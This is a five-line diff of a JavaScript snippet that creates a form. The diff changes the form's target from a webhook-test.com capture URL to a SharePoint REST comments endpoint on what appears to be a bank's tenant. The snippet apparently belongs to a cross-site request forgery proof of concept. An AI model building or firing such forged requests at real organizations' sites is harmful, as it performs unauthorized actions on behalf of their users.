@@ -1,5 +1,5 @@
 (function(){
-  const ACTION_URL = 'https://webhook-test.com/23dbd7f9f4b453a5720443d2ea9ef1b5';
+  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27';
   const AUTO_SUBMIT = false;
 
   const form = document.createElement('form');
